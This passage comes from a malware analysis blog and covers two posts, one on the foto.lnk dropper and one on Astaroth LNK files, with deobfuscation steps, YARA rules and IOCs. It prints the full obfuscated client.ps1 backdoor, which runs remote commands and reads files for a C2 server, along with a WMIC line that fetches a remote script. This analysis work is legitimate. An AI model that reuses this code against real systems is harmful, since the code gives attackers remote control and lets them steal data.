erprofile%\\SYSTEM %systemd rive% \\Windows\\System32\\Shell32.dll,4 7 %C D% HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ REG_SZ  While this is simply a list of strings, we can infer the gist of the VBS script without doing much further:\n download from hxxps://zwqip.ml/45717; reference to a file: client.ps1; changes to file attributes; delete file(s); call another file, SYSTEM; and modification or reading of the CurrentVersion\\Run\\ registry key, and the folder \\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\, both common persistence locations.  client.ps1 The C2, hxxps://zwqip.ml/45717, was not functioning by the time I got to this sample. However, looking at client.ps1 (SHA256: 3FA019CEC8B4FF90344C595494F5CBA0E5915210C0E8B175C452566C1034B680) from Hybrid-Analysis reveals the following:\n$global:lo1l1l1l1o1o1lo = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"U3lzdGVtLldlYi5FeHRlbnNpb25z\")) [System.Reflection.Assembly]::LoadWithPartialName($global:lo1l1l1l1o1o1lo)|out-null $global:lo1o1olo1l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"aHR0cHM6Ly96cnV3b2RyZWUuZ3E\")) $global:oolo1olo1l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzQyLjAuMjMxMS4xMDUgU2FmYXJpLzUzNy4zNiBFZGdlLzEyLjI0Ng==\")) $global:l1l1l1l1ll1l1l0l1l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"WC1SZWc=\")) $global:l01l0l111ll10l = $null $global:l000l1l0l0l = $null $global:l10ll0ll00 = $null $global:ool0l00l1l0 = $null $global:l0l1l0l0olol = 0 $global:l0100ll10ll0 = 30 $global:l0l1l0l1l = $null $global:o1l0lol10ol0 = 20 $global:ll1ool1oll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"Q29va2ll\")) $global:ll1oooll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"U2V0LUNvb2tpZQ==\")) $global:ll1oo11oll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"UE9TVA==\")) $global:lloo1ll1loooll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"R0VU\")) $global:llolol1l1loooll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"Q3JlYXRlZA==\")) $global:llo0l1loooll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"Y29tbWFuZA==\")) $global:llo0l1loll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"dGFza0lk\")) $global:llo0l1loll1l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"dHlwZQ==\")) $global:llo0l0lloll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"I3dhaXQ=\")) $global:l1o0l1loll1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"bmV3IHRpbWVvdXQ6\")) #Functions function MakeRequest{ param ($_type) process { $l1ool0ol1oo0l1o0l = [System.Net.HttpWebRequest]::Create($lo1o1olo1l) $l1ool0ol1oo0l1o0l.UserAgent = $global:oolo1olo1l switch($_type){ \"l10lll101l0l\"{ if($global:l01l0l111ll10l -ne $null){ ;break } $l1ool0ol1oo0l1o0l.Headers.Add($global:l1l1l1l1ll1l1l0l1l,$global:l0l1l0l1l) $l1ool0ol1oo0l1o0l.Method = $global:ll1oo11oll1 $ll1ool0lollo1l = [System.Net.HttpWebResponse] $l1ool0ol1oo0l1o0l.GetResponse() if($ll1ool0lollo1l.StatusDescription -eq $global:llolol1l1loooll1){ $global:l01l0l111ll10l = $ll1ool0lollo1l.Headers[$global:ll1oooll1]; } ;break } \"l10l11l1l000l1ll10\"{ $l1ool0ol1oo0l1o0l.Method = $global:lloo1ll1loooll1 $l1ool0ol1oo0l1o0l.Headers.Add($global:ll1ool1oll1,$global:l01l0l111ll10l) try { $ll1ool0lollo1l = [System.Net.HttpWebResponse] $l1ool0ol1oo0l1o0l.GetResponse() $responseStream = [System.IO.Stream]$ll1ool0lollo1l.GetResponseStream() $reader = New-Object System.IO.StreamReader($responseStream,[System.Text.Encoding]::UTF8) $global:l10ll0ll00 = $reader.ReadToEnd() $reader = $null $responseStream = $null $ll1ool0lollo1l = $null $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer $obj = $ser.DeserializeObject($global:l10ll0ll00) $ser = $null $global:l000l1l0l0l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($obj[$global:llo0l1loooll1])).trim() $global:l0l1l0l0olol = $obj[$global:llo0l1loll1] $obj = $null } catch{ $global:l000l1l0l0l = $null $global:l10ll0ll00 = $null } ;break } \"ol11ool1llool1llol\"{ if ($global:ool0l00l1l0 -eq $null){ ;break } Start-Sleep -Seconds 5 $l1ool0ol1oo0l1o0l.Headers.Add($global:ll1ool1oll1,$global:l01l0l111ll10l + \";\"+$global:llo0l1loll1+\"=\"+$global:l0l1l0l0olol) $l1ool0ol1oo0l1o0l.Method = $global:ll1oo11oll1 $ll1oolllolo += $global:ool0l00l1l0 $ll1oolllolo += \"`n`r\" $global:ool0l00l1l0 = $null $global:l000l1l0l0l = $null $l1ol = [System.Text.Encoding]::UTF8.GetBytes($ll1oolllolo) $ll1oolllolo = $null $l1oll1ol = $l1ool0ol1oo0l1o0l.GetRequestStream() $l1oll1ol.write($l1ol,0,$l1ol.Length) $l1ol = $null $l1oll1ol.flush() $l1oll1ol.close() $ll1ool0lollo1l = [System.Net.HttpWebResponse] $l1ool0ol1oo0l1o0l.GetResponse() $ll1ool0lollo1l = $null ;break } } $l1ool0ol1oo0l1o0l = $null } } function Execute{ param() process{ if ($global:l000l1l0l0l -ne $null){ if($global:l000l1l0l0l.StartsWith($global:llo0l1loll1l)){ $global:l000l1l0l0l = $global:l000l1l0l0l.Substring($global:llo0l1loll1l.Length) try{ $global:ool0l00l1l0 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($global:l000l1l0l0l)) } catch{ $global:ool0l00l1l0 = $_.Exception.message } } else { try{ switch($global:l000l1l0l0l.Split(\" \",2)[0]){ $global:llo0l0lloll1{ $global:o1l0lol10ol0 = [int]$global:l000l1l0l0l.Split(\" \",2)[1] $global:ool0l00l1l0 = $global:l1o0l1loll1 + $global:o1l0lol10ol0 ;break } Default{ if ($global:l000l1l0l0l) { $job = start-job -scriptblock { param($c) try { Invoke-Expression ($c) | out-string } catch { $_.Exception.message } } -Arg $global:l000l1l0l0l if (wait-job $job -Timeout $global:l0100ll10ll0) { $global:ool0l00l1l0 = receive-job $job } else { $global:ool0l00l1l0 = \"\" Remove-Job -force $job } } ;break; } } } catch { $global:ool0l00l1l0 = $_.Exception.message } $global:ool0l00l1l0 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($global:ool0l00l1l0)) $global:l000l1l0l0l = $null } } } } #Main while ($true) { if($global:l0l1l0l1l -eq $null){ $global:l0l1l0l1l = Invoke-Expression -Command \"Get-WMIObject -Class Win32_ComputerSystem | Select-Object -Property `\"Manufacturer`\" | ft -HideTableHeaders\" | Out-String -OutVariable out $global:l0l1l0l1l = $global:l0l1l0l1l.Trim() + \";\" $global:l0l1l0l1l += Invoke-Expression -Command \"Get-WMIObject -Class Win32_ComputerSystem | Select-Object -Property `\"Model`\" | ft -HideTableHeaders\" | Out-String -OutVariable out $global:l0l1l0l1l = $global:l0l1l0l1l.Trim() + \";\" $global:l0l1l0l1l += Invoke-Expression -Command \"Get-WMIObject -Class Win32_ComputerSystem | Select-Object -Property `\"Name`\" | ft -HideTableHeaders\" | Out-String -OutVariable out $global:l0l1l0l1l = $global:l0l1l0l1l.Trim() + \";\" $global:l0l1l0l1l += Invoke-Expression -Command \"Get-WMIObject -Class Win32_ComputerSystemProduct | Select-Object -Property `\"IdentifyingNumber`\" | ft -HideTableHeaders\" | Out-String -OutVariable out $global:l0l1l0l1l = $global:l0l1l0l1l.Trim() $global:l0l1l0l1l = $global:l0l1l0l1l.Replace(\"`n\",\"\").Replace(\"`r\",\"\") } else { MakeRequest \"l10lll101l0l\" MakeRequest \"l10l11l1l000l1ll10\" Execute MakeRequest \"ol11ool1llool1llol\" } Start-Sleep -Seconds $global:o1l0lol10ol0 }  The author has attempted to confuse analysis with similar variable names mixed with some Base64, and then ending with some Windows Management Instrumentation (WMI) calls. Let\u0026rsquo;s look at the Base64 strings first:\nRegular_expression('User defined','\\\\(\"[a-zA-Z0-9/=+]{3,}\"\\\\)',true,true,false,false,false,false,'List matches') Find_/_Replace({'option':'Simple string','string':'(\"'},'',true,false,true,false) Find_/_Replace({'option':'Simple string','string':'\")'},'',true,false,true,false) Fork('\\\\n','\\\\n',false) From_Base64('A-Za-z0-9+/=',true)  Gives a list of strings as follows:\nSystem.Web.Extensions hxxps://zruwodree.gq Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.105 Safari/537.36 Edge/12.246 X-Reg Cookie Set-Cookie POST GET Created command taskId type #wait new timeout:  So another domain hxxps://zruwodree.gq, and a User Agent Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.105 Safari/537.36 Edge/12.246.\nTracing back in the script we can determine the variables referenced in this section of code: $lo1o1olo1l and $oolo1olo1l refer to the above Base64 encoded domain and User Agent:\n#Functions function MakeRequest{ param ($_type) process { $l1ool0ol1oo0l1o0l = [System.Net.HttpWebRequest]::Create($lo1o1olo1l) $l1ool0ol1oo0l1o0l.UserAgent = $global:oolo1olo1l  Without looking further, I\u0026rsquo;ll make a leap and assess there is communication (GET/POST) with the second C2 and likely the results of the WMI output are POSTed back. Fireeye did some research into specific WMI calls such as these, and it is likely used for virtual machine detection. For example, on my non-virtualised host the result of Get-WMIObject -Class Win32_ComputerSystem is:\nDomain : WORKGROUP Manufacturer : LENOVO Model : 20F9CTO1WW Name : DFIR PrimaryOwnerName : (redacted) TotalPhysicalMemory : 34171711488  Compared to my VMWare environment:\nDomain : WORKGROUP Manufacturer : VMware, Inc. Model : VMware Virtual Platform Name : DESKTOP PrimaryOwnerName : (redacted) TotalPhysicalMemory : 2146947072  Dynamic Analysis Dynamic analysis is a great way to confirm the initial analysis of parsing out the scripts and seeing what you missed by a simple deobfuscation. In this case I ran the LNK file alongside Process Explorer and RegShot. On a separate Remnux VM I ran iNetSIM and Wireshark.\nImporting Process Explorer into ProcDOT is the easiest way to visualise what is going on, alongside the RegShot output. In summary we can observe:\n The LNK file launching PowerShell to extract the VBE to C:\\Users\\abc\\AppData\\Roaming\\ Wscript running the VBE as wscript //B \u0026quot;C:\\Users\\abc\\AppData\\Roaming\\_.vbe\u0026quot; Setting the registry values to lower internet security and proxy settings2 HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IntranetName, HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass, HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\UNCAsIntranet, and HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\AutoDetect Attempts to create the file C:\\Users\\abc\\client Attempts to run the command \u0026quot;C:\\Windows\\System32\\expand.exe\u0026quot; \u0026quot;C:\\Users\\abc\\client\u0026quot; \u0026quot;C:\\Users\\abc\\client.ps1\u0026quot; Attempts to delete the file C:\\Users\\abc\\client Attempts to hide the file via \u0026quot;C:\\Windows\\System32\\attrib.exe\u0026quot; +h +s +r \u0026quot;C:\\Users\\abc\\client.ps1\u0026quot; Creates file C:\\Users\\abc\\SYSTEM Creates a file at C:\\Users\\abc\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\.lnk Sets Registry Key \u0026quot;HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ to execute the file .lnk  Looking at the files created there are no significant surprises from the static analysis, just the details of putting the strings together:\n.lnk The file .lnk is another LNK file with the malicious code to execute the persistence SYSTEM\n\\Windows\\System32\\cmd.exe.%CD%+/c wscript //B //E:vbs %userprofile%\\SYSTEM.C:\\Windows\\System32\\Shell32.dll\nSYSTEM The file SYSTEM will be used to execute the client.ps1 PowerShell:\nDim shell,command Set shell = CreateObject(\u0026quot;Wscript.Shell\u0026quot;) command = \u0026quot;powershell -noLogo -NonInteractive -ExecutionPolicy Bypass -c \u0026quot;\u0026quot;invoke-expression $env:userprofile'\\client.ps1'\u0026quot;\u0026quot;\u0026quot; shell.Run command,0\nclient.ps1 There are two problems that we\u0026rsquo;ve now hit in our analysis. First, the file client.ps1 is broken. The Base64 encoded domain hxxps://zruwodree.gq throws an error due to invalid length:\n$global:lo1o1olo1l = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"aHR0cH 6Ly96cnV3b2RyZWUuZ3E\")) Exception calling \"FromBase64String\" with \"1\" argument(s): \"Invalid length for a Base-64 char array or string.\" At line:1 char:1 + $global:lo1o1olo1l = [System.Text.Encoding]::UTF8.GetString([System.C ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : FormatException  The Base64 needs another byte of padding, =, to be valid. Even when this is patched, we get another error when running the script:\nException calling \"GetResponse\" with \"0\" argument(s): \"The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.\" At C:\\Users\\abc\\Desktop\\client.ps1:40 char:17 + ... $ll1ool0lollo1l = [System.Net.HttpWebResponse] $l1ool0ol1 ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : WebException  Summary We can\u0026rsquo;t go much further with this if the domain is down and the script is broken. Further, the domain hxxps://zruwodree.gq wasn\u0026rsquo;t up at the time of writing so the final purpose/payload wasn\u0026rsquo;t identified. However, this has been a good exercise to step through a series of hoops both in static and dynamic analysis: LNK file -\u0026gt; PowerShell -\u0026gt; Encoded VBE -\u0026gt; Wscript -\u0026gt; PowerShell -\u0026gt; WMI calls.\nThere is still a wealth of analysis than can be done on this one sample:\n LNK toolmark analysis; Retrohunt similar samples; or OSINT for the domains hxxps://zruwodree.gq and hxxps://zwqip.ml, or the coding style.  A YARA rule to start with could concentrate on the LNK file embedded VBE payload:\nrule LNK_with_VBE { meta: description = \"Detects LNK file with embedded VBE script\" author = \"@mattnotmax\" date = \"2019-11-16\" hash1 = \"D28C1C4F4C705B21E84ADADB42594E42543DF4F1C4B44219569DC18B375E78E3\" strings: $a1 = \"#@~^\" ascii $a2 = \"^#~@\" ascii condition: uint16(0) == 0x4c and ($a1 and $a2) } I hope this walk-through has been informative. If you have any questions, comments or notice a glaring error, let me know at matt@bitofhex.com or via @mattnotmax\nIOCs: D28C1C4F4C705B21E84ADADB42594E42543DF4F1C4B44219569DC18B375E78E3 (foto.lnk) 3FA019CEC8B4FF90344C595494F5CBA0E5915210C0E8B175C452566C1034B680 (original client.ps1) bc6db592752c65eaf8656c6c74705d1d1eb6136da46d6397a420e84041a19a34 (patched client.ps1) hxxps://zwqip.ml hxxps://zruwodree.gq\n  If I\u0026rsquo;m incorrect, could the APT responsible please let me know to fix any errors: matt@bitofhex.com. Thanks! :) \u0026#x21a9;\u0026#xfe0e;\n See: https://getadmx.com/HKCU/Software/Policies/Microsoft/Windows/CurrentVersion/Internet%20Settings/ZoneMap \u0026#x21a9;\u0026#xfe0e;\n   ","id":2,"section":"posts","summary":"In Australia, a platypus is colloquially called the \u0026lsquo;spare parts animal\u0026rsquo;. It\u0026rsquo;s an egg-laying mammal, with a duck bill, beaver tail and webbed feet. It\u0026rsquo;s perfectly adapted to its environment despite looking like a Frankenstien of the animal world.\nWhat does this have to do with a malicious LNK file? Well, apart from the fact I like platypuses (or is it platypi?), malware using LNK files stitch together the world between the attacker and the victim.","tags":["cyberchef","malware","lnk files"],"title":"\"Say Cheese!\" An analysis of foto.lnk","uri":"https://bitofhex.com/2019/11/17/say-cheese-an-analysis-of-foto-lnk/","year":"2019"},{"content":"LNK files have a healthy life in DFIR. There is good reason: they are so awesome for analysis. Whether it be linking a user to knowledge of a file, as part of a jump list, or in their use for malicious purposes. In regards to the latter, The MITRE ATT\u0026amp;CK framework describes this as the specific technique: \u0026lsquo;shortcut modification\u0026rsquo; (T1023) which is summarised as follows:\n Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use Masquerading to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.\n Now it seems that LNK files are back (but, really, did they ever go?) On 8 July 2019, Microsoft released a blog post highlighting an Astaroth malware campaign using, in part, a downloader in the form of a malicious LNK file: certidao.htm.lnk. I located a similar sample on Hybrid-Analysis here (SHA256: 82942e3356e6d3017e4952491d2a6d8ce5748cfd15387b5bcaaf45a3cb6cf35a) and thought that I\u0026rsquo;d take a look to see what intelligence could be derived from the LNK file alone.\n The juicy part of the LNK file is in the shortcut tab:\n Here we can see the \u0026lsquo;Target\u0026rsquo; (normally a direct reference to a file) is a snippet of code, the shortcut will run minimised, and the comment looks like gibberish. Pulling out the actual details of the shortcut using LECmd provides the following:\n--- Header --- Target created: 2010-11-21 03:24:03 Target modified: 2010-11-21 03:24:03 Target accessed: 2010-11-21 03:24:03 File size: 302,592 Flags: HasTargetIdList, HasLinkInfo, HasName, HasArguments, HasIconLocation, IsUnicode, HasExpString File attributes: FileAttributeArchive Icon index: 64 Show window: SwShowminnoactive (Display the window as minimized without activating it.) Name: zvvvje4d5777hiqt2369aIEFLHKnncxmvbvjhsj2567hgeet286daUFFLHrnccmxbbrh2j2667lguet986ddaUFIHJrnnmmxbihsjj466lgukk980ddWYIIHJrbmcx Arguments: /V /C \"set x=C77jhd2766:\\\\77jhd2766W77jhd2766i77jhd2766nd77jhd2766ow77jhd2766s\\\\s77jhd2766ys77jhd2766te77jhd2766m377jhd2766277jhd2766\\\\77jhd2766w77jhd2766b77jhd2766e77jhd2766m\\\\W77jhd2766M77jhd2766I77jhd2766C.e77jhd2766x77jhd2766e o77jhd2766s g77jhd2766e77jhd2766t UF77jhd2766H77jhd2766K77jhd2766m77jhd2766xi77jhd2766h277jhd2766, fre77jhd2766evi77jhd2766r77jhd2766t77jhd2766u77jhd2766a77jhd2766l77jhd2766me77jhd2766mo77jhd2766ry77jhd2766 /77jhd2766fo77jhd2766rm77jhd2766at:\"h77jhd2766t77jhd2766t77jhd2766p77jhd2766s77jhd2766:77jhd2766/77jhd2766/st77jhd2766o77jhd2766r77jhd2766ag77jhd2766e.77jhd2766go77jhd2766og77jhd2766lea77jhd2766pis77jhd2766.co77jhd2766m77jhd2766/77jhd2766a77jhd2766w77jhd2766s77jhd2766d77jhd2766x/77jhd27660977jhd2766/v77jhd2766.t77jhd2766xt77jhd2766#0277jhd276650177jhd27664q277jhd2766977jhd2766I77jhd2766S77jhd2766q77jhd2766c77jhd2766z77jhd2766v\" \u0026\u0026echo %x:77jhd2766=%|%ComSpec%\" Icon Location: %SystemRoot%\\system32\\imageres.dll --- Link information --- Flags: VolumeIdAndLocalBasePath Volume information Drive type: Fixed storage media (Hard drive) Serial number: 086F96AF Label: (No label) Local path: C:\\Windows\\System32\\cmd.exe --- Target ID information (Format: Type == Value) --- Absolute path: My Computer\\C:\\Windows\\System32\\cmd.exe -Root folder: GUID == My Computer -Drive letter == C: -Directory == Windows Short name: Windows Modified: 2019-04-30 20:34:24 Extension block count: 1 --------- Block 0 (Beef0004) --------- Long name: Windows Created: 2009-07-14 03:20:10 Last access: 2019-04-30 20:34:24 MFT entry/sequence #: 671/1 (0x29F/0x1) -Directory == System32 Short name: System32 Modified: 2019-04-30 18:45:08 Extension block count: 1 --------- Block 0 (Beef0004) --------- Long name: System32 Created: 2009-07-14 03:20:12 Last access: 2019-04-30 18:45:08 MFT entry/sequence #: 2549/1 (0x9F5/0x1) -File == cmd.exe Short name: cmd.exe Modified: 2010-11-21 03:24:04 Extension block count: 1 --------- Block 0 (Beef0004) --------- Long name: cmd.exe Created: 2010-11-21 03:24:04 Last access: 2010-11-21 03:24:04 MFT entry/sequence #: 20227/1 (0x4F03/0x1) --- End Target ID information --- --- Extra blocks information ---  Environment variable data block Environment variables: %ComSpec%  Special folder data block Special Folder ID: 37  Known folder data block Known folder GUID: 1ac14e77-02e7-4e5d-b744-2eb1ae5198b7 == System32  Property store data block (Format: GUID\\ID Description == Value) 46588ae2-4cbc-4338-bbfc-139326986dce\\4 SID == S-1-5-21-814163198-2266970693-1875007973-1002  Tracker database block Machine ID: dedicado-web MAC Address: 00:26:b9:fd:e1:82 MAC Vendor: DELL Creation: 2019-03-21 04:28:56 Volume Droid: 8c78ff20-8b31-44de-bbba-eabca30a81ea Volume Droid Birth: 8c78ff20-8b31-44de-bbba-eabca30a81ea File Droid: d73dcd41-4b91-11e9-8dc8-0026b9fde182 File Droid birth: d73dcd41-4b91-11e9-8dc8-0026b9fde182 The full output provides a bunch of useful information. From an immediate incident response perspective, we\u0026rsquo;d probably go straight to the block of obfuscated code and see what it\u0026rsquo;s doing. From a glance it looks like a \u0026lsquo;find/replace\u0026rsquo; could clean it up substantially:\nArguments: /V /C \"set x=C:\\\\Windows\\\\system32\\\\wbem\\\\WMIC.exe os get UFHKmxih2, freevirtualmemory /format:\"https://storage.googleapis.com/awsdx/09/v.txt#025014q29ISqczv\" \u0026\u0026echo %x:=%|%ComSpec%\" Job done? So, what else is there? We have the critical IOC of the path where the LNK file is pointing and we can pivot from there. The best thing about malicious LNK files are the metadata they contain about the attacker\u0026rsquo;s infrastructure. In this case (amongst other interesting values):\nSerial number: 086F96AF Machine ID: dedicado-web MAC Address: 00:26:b9:fd:e1:82 MAC Vendor: DELL These values give information relating to the hardware of the attacker\u0026rsquo;s infrastructure, including the NetBios name, \u0026lsquo;dedicado-web\u0026rsquo;, and the MAC address, \u0026lsquo;00:26:b9:fd:e1:82\u0026rsquo;.\nInterestingly we can switch to open source intelligence (aka Google) and lookup \u0026lsquo;dedicado-web\u0026rsquo; which led me to a Brazilian VPS of the same name. It has links to the more well-known bulletproof provider OVH. This fits with the overwhelmingly Brazilian focus of the Astaroth campaign.\n Yara me this\u0026hellip; But the other data remains useful. Leveraging the data within the LNK file we can hunt for other samples of files that have the same \u0026lsquo;toolmarks\u0026rsquo; and see what we come up with. Here, my beginner Yara skills actually come in handy:\nrule Astaroth { meta: author = \"@mattnotmax\" date = \"2019-07-15\" description = \"LNK file with a unique MAC address or NETBIOS name in relation to a Astaroth campaign\" reference = \"https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/\" sample = \"82942e3356e6d3017e4952491d2a6d8ce5748cfd15387b5bcaaf45a3cb6cf35a\" strings: $mac = {00 26 B9 FD E1 82} $netbios = \"dedicado-web\" fullword ascii condition: uint16(0) == 0x4c and ($mac or $netbios) } Searching on Hybrid-Analysis (aka poor man\u0026rsquo;s Virus Total) gives a good result of 22 hits, of which 21 had shared samples. These were uploaded between 24 April 2019 and 11 June 2019.\n Some of these are tagged with #banload or #apt so the may not be relevant. Processing the group again with LECmd and they appear to be very consistent (edited for screen size):\n.tg {border-collapse:collapse;border-spacing:0;} .tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:black;} .tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:black;} .tg .tg-xldj{border-color:inherit;text-align:left} .tg .tg-0pky{border-color:inherit;text-align:left;vertical-align:top}   Truncated Hash TargetCreated FileSize VolumeSerialNumber MachineID MachineMACAddress MACVendor   018c35d8...fb1131f9 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   0a810c66...301f9f5d 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   12ad543a...63592ec5 2010-11-21 03:24:03 302592 086F96AF ns237 00:26:b9:fd:e1:82 DELL   1a6e71a8...6c4e2e00 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   441cd985...60b49a54 2010-11-21 03:24:03 302592 086F96AF ns237 00:26:b9:fd:e1:82 DELL   5694add6...2f1f7888 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   57603915...8bccc5a2 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   589fd0b6...277a0d87 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   5a7fb5e6...4a99e795 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   8156fd98...1df9b7ed 2010-11-21 03:24:03 302592 086F96AF ns237 00:26:b9:fd:e1:82 DELL   82942e33...cb6cf35a 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   862fcf17...5fed9048 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   98ffca4f...e720dc16 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   ab3a338d...fe030518 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   c783a629...15af9228 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   ca8757ed...b86eb751 2010-11-21 03:24:03 302592 086F96AF ns237 00:26:b9:fd:e1:82 DELL   cf67b1fb...9e93ec14 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   dde556d6...71c7ab44 2010-11-21 03:24:03 302592 086F96AF dedicado-web 00:26:b9:fd:e1:82 DELL   e2239cd4...e18d9dbd 2010-11-21 03:24:03 302592 086F96AF ns237 00:26:b9:fd:e1:82 DELL   e239a967...71a2c2ef 2010-11-21 03:24:03 302592 086F96AF ns237 00:26:b9:fd:e1:82 DELL   f2d0cdbf...044ccbb5 2010-11-21 03:24:03 302592 086F96AF ns237 00:26:b9:fd:e1:82 DELL   The similar results in the above table is also matched in a review of the in-line code which has the same obfuscation as the first example. It\u0026rsquo;s no secret I am a fan of CyberChef and using the forks, registers, and some regex the relevant URLs can be extracted from the in-line code:\n[{\"op\":\"Fork\",\"args\":[\"\\\\n\",\"\\\\n\",true]},{\"op\":\"Register\",\"args\":[\"(? Becomes\u0026hellip;\nhxxp://storage[.]googleapis[.]com/midgoldem/09/v[.]txt#025040xiuj6rl9d hxxp://storage[.]googleapis[.]com/midgoldem/09/v[.]txt#025070xbhj6luk0 hxxp://storage[.]googleapis[.]com/xmoabx/04/v[.]txt#025051IJrmxxmir hxxp://e8aUHrmmr[.]intelcore-i1[.]website:25/9/?13825xmuj8luk hxxp://storage[.]googleapis[.]com/midgoldem/06/v[.]txt#025038Knmbj2257 hxxps://storage[.]googleapis[.]com/awsdx/09/v[.]txt#025050nmble0aUH hxxps://storage[.]googleapis[.]com/ultramaker/09/v[.]txt#025010bvrhj267l hxxps://storage[.]googleapis[.]com/ultramaker/09/v[.]txt#025060xjuf7hrl3 hxxps://storage[.]googleapis[.]com/ultramaker/09/v[.]txt#025060aIUIHKrnc hxxp://storage[.]googleapis[.]com/kodesca/08/v[.]txt#025028jd3ISnxvj hxxps://storage[.]googleapis[.]com/awsdx/09/v[.]txt#025014q29ISqczv hxxps://storage[.]googleapis[.]com/ultramaker/08/v[.]txt#025018ef7hil69I hxxps://storage[.]googleapis[.]com/awsdx/09/v[.]txt#025060jsf7il36h hxxp://storage[.]googleapis[.]com/teslaasth/09/v[.]txt#025050ELKqxmvjd hxxps://storage[.]googleapis[.]com/awsdx/09/v[.]txt#0250800UHbcbrs4 hxxp://storage[.]googleapis[.]com/kodesca/09/v[.]txt#025091e6UHrcxvs hxxp://q39ESqczv[.]intelcore-i5[.]site:25020/09/?138025020qixvj22h hxxps://storage[.]googleapis[.]com/ultramaker/06/v[.]txt#0250906uk8dWUIJ hxxp://storage[.]googleapis[.]com/kodesca/04/v[.]txt#025058il39ELvmd hxxp://storage[.]googleapis[.]com/kodesca/06/v[.]txt#025022e986IJrmc hxxp://storage[.]googleapis[.]com/midgoldem/06/v[.]txt#025055rmxvs26ge Don\u0026rsquo;t take my word for it\u0026hellip; The above is slightly contrived, in that we only were able to look back a couple of months, and are getting results from probably the same Astaroth campaign. Sure, we probably could have written a different Yara rule and got similar (or more) results; however, the power of LNK file metadata is long-term tracking of threat actors who re-use the same files, and transfer their metadata from campaign x to campaign y. This \u0026lsquo;crude\u0026rsquo; example is a good demonstration of using this technique.\nThis tactic was nicely demonstrated in late-2018 through Fireeye\u0026rsquo;s outing of Cozy Bear\u0026rsquo;s reuse of a LNK file from 2016 which is detailed here: Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign\nOther sources of great information are numerous 